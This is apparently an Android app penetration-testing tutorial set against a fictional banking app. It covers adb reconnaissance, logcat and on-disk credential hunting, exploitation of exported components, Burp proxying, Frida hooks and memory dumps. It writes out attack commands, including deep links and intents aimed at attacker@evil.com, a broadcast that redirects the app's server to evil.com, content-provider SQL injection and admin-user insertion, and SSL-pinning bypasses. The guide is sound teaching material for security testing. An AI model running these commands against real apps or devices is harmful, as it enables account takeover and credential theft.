SECTION 01

The Pentester's Mindset

Before you touch a single command, understand what you're actually trying to find

A professional pentester does not run commands and hope something interesting appears. Every command serves a hypothesis. You form a question ‚Äî "does this app store credentials insecurely?" ‚Äî then design a sequence of steps to answer it. Everything below follows this model: hypothesis ‚Üí evidence ‚Üí conclusion.

The Four Questions You Always Ask

Q1
Where does the app store sensitive data?
Disk (SQLite, SharedPrefs, files), in-memory, external storage, or crash logs. Your job is to find it and determine if it's protected.
Q2
What does it expose to the outside world?
Exported Activities, Services, Receivers, Content Providers, deep links. These are doors. Your job is to find out which ones should be locked but aren't.
Q3
How does it talk to the backend?
HTTP vs HTTPS, certificate pinning, request authentication, API structure. The network layer is where you find IDOR, auth bypass, and data leakage at scale.
Q4
What protections does it have ‚Äî and can we beat them?
Root detection, SSL pinning, emulator detection, obfuscation, anti-debug. These are speed bumps, not walls. Understand each one so you can route around it.
SECTION 02

Reconnaissance ‚Äî Map the Attack Surface

You cannot attack what you cannot see. Recon tells you exactly where to aim.

When I first get an APK, the single most important question is: what has the developer accidentally left open? Android's component system is powerful but developers routinely misconfigure it. An exported component is a door that any other app or ADB command can open. My first job is to map every door, then systematically check whether each one should actually be locked.

The Most Important Command You'll Run

This single command gives you the entire anatomy of the app. Run it before anything else. The output tells you every component, whether it's exposed, what permissions protect it, and whether the app allows backups.

adb ‚Äî package reconnaissance
adb shell dumpsys package com.example.bankapp run this first, every single time
adb shell pm list packages -3 list third-party apps to find package name
adb shell pm list packages | grep bank filter by keyword
adb shell pm path com.example.bankapp find APK path on device
adb pull /data/app/com.example.bankapp-1/base.apk ./ extract APK for decompilation

What to Hunt For in dumpsys Output

CRITICAL
exported=true on Activities that should be private
If a DashboardActivity, AdminActivity, or any post-login screen is exported, an attacker can launch it directly with am start without ever authenticating. This is authentication bypass. Look specifically for any Activity name that implies it comes after a login flow ‚Äî Dashboard, Home, Account, Transfer, Admin.
CRITICAL
exported=true on Content Providers with no permission
A content provider without a readPermission/writePermission attribute is a fully open database. Any app on the device ‚Äî or anyone with ADB ‚Äî can read, insert, update, or delete data from it. This is one of the most severely underestimated Android vulnerabilities.
HIGH
allowBackup=true
Anyone with USB access can run adb backup and extract all app data including tokens, databases, and preference files. Particularly dangerous in corporate BYOD environments or if a device goes to a repair shop.
HIGH
debuggable=true in a production APK
A debuggable app can have a Java debugger attached without root. You can pause execution, inspect all variables, and call arbitrary methods on live objects. This should never appear in a production build ‚Äî ever.
MEDIUM
Excessive dangerous permissions
Does a banking app need READ_SMS? Maybe (for OTP). Does a flashlight app need READ_CONTACTS? No. Excess permissions are worth flagging ‚Äî they expand the attack surface and are often a sign of poor security hygiene throughout the codebase.
Real dumpsys output excerpt ‚Äî this is what a finding looks like
Activity Resolver Table:
  com.example.bankapp/.AdminPanelActivity
    exported=true      <-- any app or ADB can launch this directly
    permission=null    <-- no permission required to launch

Provider:
  com.example.bankapp/.UserDataProvider
    exported=true
    readPermission=null    <-- open read access to any caller
    writePermission=null   <-- open write access to any caller

  allowBackup=true     <-- full data extractable via ADB backup
  debuggable=true      <-- attach debugger without root
üî¥ Every exported=true component with permission=null is an entry point. Write them all down in a list before you do anything else. You will test each one individually in Section 5.
SECTION 03

Logcat Analysis ‚Äî What the App Tells You About Itself

Developers leave breadcrumbs. A professional knows exactly which breadcrumbs matter.

Logcat is not just a stream of text you skim. It's the app confessing its internal state in real time. The question I'm always asking is: is the app logging anything it absolutely should not be? Developers add debug logs during development and forget to remove them. In financial and health apps, this is where I most often find credentials, session tokens, and API keys sitting in plaintext.

Setup: Clear First, Then Capture

Always clear the buffer before launching the app. Otherwise you're reading logs from a previous session and you'll miss the critical startup sequence ‚Äî where most sensitive data is logged ‚Äî entirely.

logcat ‚Äî capture pipeline
adb logcat -c ALWAYS purge before launching app
adb shell am start -n com.example.bankapp/.MainActivity launch the app
adb logcat --pid=$(adb shell pidof -s com.example.bankapp) filter to this app only ‚Äî less noise
adb logcat --pid=$(adb shell pidof -s com.example.bankapp) > session.txt save to file for systematic grep later
adb logcat -s okhttp.OkHttpClient raw HTTP logs if app uses OkHttp in debug mode

Phase 1: The Launch Sequence (First 30 Seconds Are Gold)

The moment an app starts, it initialises its configuration, loads cached credentials, and checks the server. All of this happens in a burst. Watch this window ‚Äî it is when most credential leaks occur.

CRITICAL
Authentication tokens logged on startup
App reads a cached token from storage and logs it for debugging. The token is now in your logcat file and valid for the current session. Copy it into Burp Suite Repeater with the Authorization header ‚Äî you have full account access.
CRITICAL
API keys or secrets logged during initialisation
App loads its configuration from BuildConfig or a config file and logs key values. Even a partial key confirms the presence of hardcoded secrets worth extracting via static analysis (jadx).
HIGH
Database file paths revealed
A log line like "Opened /data/data/com.example.bankapp/databases/users.db" tells you exactly where to look during file system analysis. Cross-reference this with what you find in Section 4.
Critical finding ‚Äî credentials in logcat during startup
D/AuthManager(4321): Loading cached session...
D/AuthManager(4321): token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIn0.abc123
D/AuthManager(4321): user_id=12345  role=STANDARD_USER
I/OkHttp   (4321): --> POST https://api.bankapp.com/v1/session/refresh
I/OkHttp   (4321): Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...

Phase 2: Interact Heavily ‚Äî Watch What Each Action Triggers

Don't launch and passively read. Log in, navigate every screen, change settings, make transactions. Each action may produce different log output. You're looking for any action that causes sensitive data to be printed.

CRITICAL
Password or PIN logged during the login flow
Plaintext password in D/ or V/ level logs. Even tagged as "LoginViewModel" or "debug only" ‚Äî it's still exposed to anyone with ADB access or access to crash reporting services like Firebase Crashlytics.
HIGH
Error messages revealing internal API structure
A 404 error like "E/Retrofit: 404 https://api.bankapp.com/v2/admin/users" reveals an endpoint you didn't know existed. Call it directly from Burp. SQL errors reveal table names and column structure ‚Äî note every single one.
HIGH
Cryptographic operations logged with key material or weak parameters
Lines like "D/CryptoUtil: encrypting with key=a3f9c2..." or "D/AES: IV=0000000000000000". A static zero IV in AES-CBC means encryption is deterministic and completely broken. Key material in logs means you can decrypt any stored data offline.
What a vulnerable login flow looks like in logcat
D/LoginViewModel(4321): Attempting login for user: john.doe@example.com
D/LoginViewModel(4321): password=MySecretP@ssw0rd          <-- CRITICAL
D/NetworkClient(4321): POST /api/v1/auth body={"user":"john.doe","pass":"MySecretP@ssw0rd"}
E/Retrofit  (4321): 404 https://api.bankapp.com/v2/admin/dashboard  <-- undocumented endpoint
E/SQLiteDB  (4321): no such column: admin_level in table users       <-- schema leak

Phase 3: Systematic grep After Capture

Save your logcat session to a file, then search it methodically. Don't eyeball it ‚Äî you will miss things.

grep ‚Äî what to hunt for in saved logcat
grep -iE 'password|passwd|secret|token|key|auth' session.txt credential patterns
grep -iE 'bearer|jwt|eyJ[A-Za-z0-9]' session.txt JWT tokens (always start with eyJ)
grep -iE 'sql|query|select|insert|drop|table' session.txt SQL fragments ‚Üí schema leakage
grep -iE 'exception|error|stacktrace|caused by' session.txt errors ‚Üí internal paths and class names
grep -iE 'http://|ftp://' session.txt plaintext HTTP traffic ‚Äî always critical
grep -iE 'AES|RSA|DES|MD5|SHA1|encrypt|decrypt' session.txt weak crypto usage
grep -iE '[0-9]{13,16}' session.txt card numbers (13‚Äì16 digit sequences)
‚ö† MD5 and SHA1 in logs for anything security-related is a finding. MD5 is broken for cryptographic purposes. SHA1 is deprecated. Flag both and document the exact context ‚Äî password hashing, certificate pinning, or data integrity.
SECTION 04

File System Analysis ‚Äî Secrets Stored on Disk

The app's private directory is a goldmine. Most developers don't realise how much they leave there.

Android gives each app a private directory at /data/data/<package>/ that other apps cannot read ‚Äî but with root, we can. The core question is: what sensitive data does this app persist to disk, and is any of it unencrypted? Developers frequently cache tokens, store credentials, and log user data to disk for performance or convenience without applying any encryption.

SharedPreferences ‚Äî The First Place to Look

SharedPreferences are XML files that apps use to persist settings and state between sessions. They are the most common location for improperly stored authentication tokens, user IDs, and sometimes even passwords. Pull these before anything else.

adb ‚Äî SharedPreferences extraction
adb shell su -c 'ls /data/data/com.example.bankapp/shared_prefs/' see what XML files exist
adb pull /data/data/com.example.bankapp/shared_prefs/ ./prefs/ pull all at once
grep -iE 'token|password|key|secret|session|auth' prefs/*.xml search all prefs files simultaneously
What a vulnerable SharedPreferences file looks like
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="auth_token">eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIn0.abc</string>
    <string name="username">john.doe@example.com</string>
    <string name="password">dXNlcjEyMzQ1Njc4</string>  <!-- base64: user12345678 -->
    <boolean name="rememberMe" value="true" />
    <string name="last_login_ip">192.168.1.45</string>
</map>
CRITICAL
Authentication token stored in plaintext
A JWT or OAuth bearer token stored as a plain string value. This token is immediately usable. Paste it into Burp Suite's Repeater with the Authorization header and you have full account access without knowing the password.
CRITICAL
Password stored in SharedPreferences (even Base64 encoded)
Base64 is encoding, not encryption. Decode it with echo <value> | base64 -d. Plaintext or base64 password stored for "remember me" functionality is a direct credential theft vulnerability with no additional steps required.
‚úî Check ALL preference files, not just the obvious ones. Look for files named SessionPrefs, UserCache, AppConfig, Settings ‚Äî developers use creative names for files that contain sensitive data.

SQLite Databases ‚Äî Where the Real Data Lives

Apps store everything from user profiles to transaction history to cached API responses in SQLite. The threat model: a rooted device or malicious app reading data that should be encrypted at rest but isn't.

sqlite3 ‚Äî database analysis workflow
adb shell su -c 'ls /data/data/com.example.bankapp/databases/' list all DB files ‚Äî read every name
adb pull /data/data/com.example.bankapp/databases/ ./dbs/ pull everything at once
sqlite3 dbs/app.db open the database
.tables list all tables ‚Äî read every name carefully
.schema users inspect column names ‚Äî look for password, pin, token
SELECT * FROM users LIMIT 5; sample data ‚Äî look for unencrypted sensitive columns
SELECT * FROM sessions; active session tokens ‚Äî immediately reusable
SELECT * FROM cached_responses; apps sometimes cache full API responses with tokens in them
PRAGMA integrity_check; if "not a database" ‚Üí encrypted with SQLCipher, note it
Typical enumeration session ‚Äî what a finding looks like
sqlite> .tables
accounts    cached_responses    messages    sessions    transactions    users

sqlite> .schema users
CREATE TABLE users (id INTEGER, username TEXT, password TEXT, pin TEXT, role TEXT);
                                                ^^^^^^^^^^^^^^^^^  ^^^^^^^^ plaintext!

sqlite> SELECT * FROM users;
1|admin@bank.com|plaintext_password|1234|ADMIN

sqlite> SELECT * FROM sessions;
1|12345|eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9.xyz|2025-12-31
                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ valid JWT, copy to Burp
‚ö† If PRAGMA integrity_check returns "file is not a database", the DB is encrypted with SQLCipher. Note this and return with Frida in Section 7 to hook the SQLCipher open call and extract the key at runtime ‚Äî then open the DB offline.

External Storage ‚Äî No Root Required

adb ‚Äî external storage (readable without root)
ls /sdcard/Android/data/com.example.bankapp/ no root needed ‚Äî any app can read this
adb shell su -c 'find /data/data/com.example.bankapp/ -name "*.json"' config files often contain API keys
adb shell su -c 'find /data/data/com.example.bankapp/ -name "*.pem" -o -name "*.key"' embedded certificates or private keys
üî¥ Any sensitive data in /sdcard/Android/data/ is readable by any app with READ_EXTERNAL_STORAGE permission or via ADB without root. Finding credentials or PII here is a critical vulnerability that requires zero exploitation skill to abuse.
SECTION 05

Exported Component Testing ‚Äî Opening Unlocked Doors

Every exported component is a hypothesis: can I do something the developer didn't intend?

When I test an exported Activity, I'm not just checking "does it open." I'm asking: what happens when I reach this screen without going through the normal authentication flow? Does it show me data? Can I perform privileged actions? Can I use intent extras to control its behaviour in unintended ways? For Content Providers, the question is: can I read data I shouldn't, inject SQL to extract the whole database, or write data to gain elevated privilege?

Exported Activities ‚Äî Authentication Bypass

Hypothesis: A post-login screen is exported and doesn't verify the user is authenticated before rendering. You bypass the login screen entirely and reach protected functionality.

am start ‚Äî activity bypass testing
adb shell am start -n com.example.bankapp/.DashboardActivity does it open without login? critical if yes
adb shell am start -n com.example.bankapp/.AdminPanelActivity admin screen ‚Äî highest priority to test
adb shell am start -n com.example.bankapp/.TransferActivity --es recipient attacker@evil.com --ei amount 10000 pre-fill form with attacker data via intent extras
adb shell am start -a android.intent.action.VIEW -d 'bankapp://transfer?to=attacker@evil.com&amount=5000' deep link injection ‚Äî can any website trigger this?
adb shell am start -a android.intent.action.VIEW -d 'bankapp://reset_password?token=AAAA' password reset link hijack attempt
CRITICAL
Post-login screen opens without authentication state
The DashboardActivity opened and showed real data without requiring login. The screen relies on being launched from the normal flow rather than verifying auth in onResume(). Any malicious app on the device can reach this screen and access the victim's account data.
HIGH
Deep link handler accepts attacker-controlled parameters without validation
If bankapp://transfer?to=attacker opens a pre-filled transfer form, any website the user visits via a link can trigger this. Combined with social engineering ("click here for your reward"), this becomes a one-click account drain.

Content Providers ‚Äî Open Database Attack

A content provider is essentially a REST API over a database. If it's exported without permissions, you have full read/write access to whatever data it exposes. This is one of the most severe Android-specific vulnerabilities and one of the most underappreciated.

content ‚Äî provider exploitation
adb shell content query --uri content://com.example.bankapp.provider/users attempt to read all users ‚Äî no auth required
adb shell content query --uri content://com.example.bankapp.provider/users --projection 'username,password' request specific columns ‚Äî credential dump
adb shell content query --uri content://com.example.bankapp.provider/users --where "id='1 OR 1=1'" SQL injection test ‚Äî returns all rows if vulnerable
adb shell content query --uri content://com.example.bankapp.provider/users --where "id=1 UNION SELECT name,sql,3,4 FROM sqlite_master--" UNION injection to dump full schema
adb shell content insert --uri content://com.example.bankapp.provider/users --bind username:s:hacker --bind role:s:admin privilege escalation ‚Äî inject admin user
Unprotected content provider ‚Äî full credential dump with no authentication
$ adb shell content query --uri content://com.example.bankapp.provider/users

Row: 0 id=1, username=admin@bank.com, password=admin123, role=ADMIN, balance=999999.00
Row: 1 id=2, username=john@example.com, password=password1, role=USER, balance=5432.10
Row: 2 id=3, username=jane@example.com, password=qwerty123, role=USER, balance=1200.00

‚Üí Complete credential dump. No authentication required. Zero exploitation skill needed.
‚úî Use Drozer's run scanner.provider.injection -a com.example.bankapp to automate SQL injection testing across all discovered content URIs. It tests query injection and path traversal automatically and produces a clean report.

Broadcast Receivers ‚Äî Intent Injection

am broadcast ‚Äî receiver testing
adb shell am broadcast -a com.example.bankapp.UPDATE_CONFIG --es server_url http://evil.com/api server redirect ‚Äî most dangerous if it works
adb shell am broadcast -a com.example.bankapp.FORCE_LOGOUT denial of service ‚Äî log anyone out remotely
adb shell am broadcast -a android.intent.action.BOOT_COMPLETED -p com.example.bankapp trigger boot receiver ‚Äî test for unintended startup behaviour
CRITICAL
App accepts server URL via broadcast without validation
If UPDATE_CONFIG with server_url=http://evil.com succeeds, the app now sends all traffic to an attacker-controlled server. Every future API call, including login credentials, goes to the evil server. This is effectively a complete, persistent account takeover vector that survives app restarts.
SECTION 06

Network Traffic Analysis ‚Äî Reading the App's Conversations

The network layer reveals the entire API contract, authentication mechanisms, and data handling.

When I set up Burp and start intercepting, I'm not just looking at what the app sends. I'm reverse-engineering the API. What endpoints exist? What do the request headers look like? Is the auth token in the header, body, or cookie? Are there endpoints the app calls that aren't documented? Can I modify a request parameter to access another user's data? The network layer is where I find the most business-logic vulnerabilities.

adb ‚Äî proxy setup
adb reverse tcp:8080 tcp:8080 route device traffic ‚Üí your Burp on localhost
adb shell settings put global http_proxy 127.0.0.1:8080 set device proxy
objection -g com.example.bankapp explore attach Objection shell
android sslpinning disable bypass SSL pinning ‚Äî run this before navigating app
adb shell settings put global http_proxy :0 REMOVE proxy when done ‚Äî always clean up

What to Hunt for in Every Request

CRITICAL
Traffic over plain HTTP for any sensitive flow
Login credentials or session tokens sent over HTTP are interceptable by anyone on the same network. In 2025 this should never happen for authentication flows. Even one HTTP request in a mostly-HTTPS app is a critical finding.
CRITICAL
Insecure Direct Object Reference (IDOR)
Request to /api/v1/users/12345/transactions. Change 12345 to 12346 in Burp Repeater. If you get another user's transactions, this is a critical IDOR. Test every numeric or UUID parameter in every URL against other user IDs. This is the single most common high-severity API finding.
HIGH
Authentication token in URL query string
Token appearing as ?auth_token=xyz in the URL rather than in the Authorization header. Query strings appear in server access logs, browser history, and HTTP Referer headers ‚Äî exposing tokens to unintended recipients indefinitely.
HIGH
No certificate pinning ‚Äî traffic intercepted with self-signed cert
If Burp intercepts HTTPS traffic without any SSL error in the app, there is no certificate pinning. Any MiTM attacker on the same network (hotel WiFi, coffee shop) can intercept all traffic with a basic proxy setup.

API Endpoint Discovery Beyond What Burp Shows

Burp only captures traffic the app actually makes during your session. Discover endpoints the app knows about but didn't call by reading the decompiled source.

jadx ‚Äî static companion for API discovery
jadx -d ./decompiled target.apk decompile APK to readable Java
grep -rE '"/(api|v[0-9]+)/[a-z]' ./decompiled/ extract API paths from source code
grep -rE 'http[s]?://[a-zA-Z0-9./_-]+' ./decompiled/ find all hardcoded URLs
grep -rE 'BuildConfig\.(API_KEY|SECRET|TOKEN)' ./decompiled/ hardcoded secrets in BuildConfig
‚Ñπ If SSL pinning bypass via Objection fails, check the APK for a Network Security Config file at res/xml/network_security_config.xml. The pinning configuration is declared there. You can patch it out with apktool, rebuild, and resign the APK to remove pinning entirely.
SECTION 07

Frida Runtime Analysis ‚Äî Inside the Running App

ADB sees the app from outside. Frida lets you reach inside and change what it does while it runs.

Frida is the most powerful tool in mobile pentesting because it eliminates the boundary between "what I can observe" and "what I can control." I use it when I need to bypass a security check, when I want to see the exact arguments a function receives to catch decrypted values, or when I want to modify return values to change app behaviour. The key skill is identifying WHICH function to hook ‚Äî that comes from reading decompiled source code first, then targeting the exact method by name.

Hook Crypto Functions ‚Äî Catch Decrypted Values

The most powerful Frida technique in a financial app. The app encrypts data on disk (which looks secure) but must decrypt it at runtime. Hook the decrypt function and print the plaintext output before the app uses it.

frida ‚Äî hook AES decrypt to intercept all plaintext output
Java.perform(function() { var Cipher = Java.use('javax.crypto.Cipher'); Cipher.doFinal.overload('[B').implementation = function(data) { var result = this.doFinal(data); // call original console.log('[DECRYPT] ' + Java.use('java.lang.String').$new(result)); return result; // return normally so app functions }; });
CRITICAL
Decrypted password or token appears in Frida output
The app stores an AES-encrypted token on disk (which appears secure), but the decrypted value is now visible via the hook. Encryption provides no real security against a compromised device ‚Äî the attacker simply waits for the app to decrypt on their behalf.

Intercept Login Credentials Before Encryption

Sometimes SSL pinning bypass isn't enough ‚Äî the app may encrypt the request body before sending. Hook the login function directly to capture credentials before they're encrypted or sent anywhere.

frida ‚Äî hook login function to intercept plaintext credentials
Java.perform(function() { // Find class name in decompiled source first (jadx) var LoginRepo = Java.use('com.example.bankapp.auth.LoginRepository'); LoginRepo.authenticate.overload('java.lang.String','java.lang.String') .implementation = function(user, pass) { console.log('[LOGIN] user: ' + user + ' pass: ' + pass); return this.authenticate(user, pass); // call original }; });

Objection ‚Äî Frida Shell for Common Tasks

objection ‚Äî interactive runtime shell
objection -g com.example.bankapp explore attach interactive shell to running app
android sslpinning disable bypass SSL pinning ‚Äî hooks common pinning libraries
android root disable bypass root detection
android hooking list classes list all classes ‚Äî find what to hook
android hooking watch class_method com.example.bankapp.Auth.login --dump-args --dump-return hook one method, print all args and return value
env show all app directory paths ‚Äî quicker than manual ADB
SECTION 08

Memory Analysis ‚Äî What the App Hides in RAM

Data encrypted on disk must be decrypted in memory to be used. Memory is the great equaliser.

This is the technique most junior testers skip and most production apps don't account for. An app can encrypt every database, every file, every preference ‚Äî but at the moment it uses any of that data, it must be in plaintext in memory. Dump the process memory at the right moment and you get everything. The right moment is always: right after login, right after a sensitive operation, right after a key is generated.

fridump ‚Äî full memory dump and analysis
python3 fridump.py -U -s com.example.bankapp -o ./memdump/ dump all readable memory regions to files
strings ./memdump/* > all_strings.txt extract all readable strings from dump
grep -iE 'bearer|eyJ[A-Za-z0-9._-]{20,}' all_strings.txt find JWT tokens in memory
grep -E '[A-Za-z0-9+/]{40,}={0,2}' all_strings.txt long base64 strings ‚Äî likely encryption keys or tokens
grep -iE 'BEGIN (RSA|PRIVATE|CERTIFICATE)' all_strings.txt PEM-encoded private keys in memory ‚Äî critical if found
‚úî Dump memory at three key moments: (1) on app startup, (2) immediately after login, (3) after logging out. Comparing the three dumps tells you whether the app properly clears sensitive data from RAM on logout ‚Äî a common secure coding failure.
CRITICAL
Private key or certificate found in memory dump
A PEM-formatted private key in RAM means the app loaded it for signing or mutual TLS. If you extract it, you can impersonate the app to the backend API entirely ‚Äî every API call from every user is now spoofable.
CRITICAL
Valid session token found in memory after logout
You logged out, then dumped memory. The token is still there. The app doesn't clear sensitive data from memory on logout. If the server also doesn't invalidate server-side on logout, that token is still valid and fully usable.
HIGH
SQLCipher database encryption key found in memory
The encrypted database key must be loaded into RAM to decrypt the DB. Find it via memory dump, then open the encrypted database offline with SQLCipher using the extracted key ‚Äî bypassing the encryption entirely without touching the app again.
